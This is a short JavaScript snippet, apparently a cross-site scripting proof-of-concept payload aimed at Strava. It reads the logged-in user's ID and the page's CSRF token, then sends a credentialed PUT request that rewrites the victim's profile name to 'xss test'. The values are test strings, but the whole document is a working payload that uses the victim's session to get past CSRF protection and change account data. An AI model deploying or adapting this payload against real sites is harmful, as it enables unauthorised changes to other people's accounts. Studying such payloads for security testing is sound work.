(async()=>{
  const id = window.StravaSentry?.userId;
  const csrf = document.querySelector('meta[name="csrf-token"]').content;
  const res = await fetch('/athletes/' + id, {
    method: 'PUT',
    credentials: 'include',
    headers: {
      'X-Csrf-Token': csrf,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      athlete: { firstname: 'xss', lastname: 'test' }
    })
  });
})();
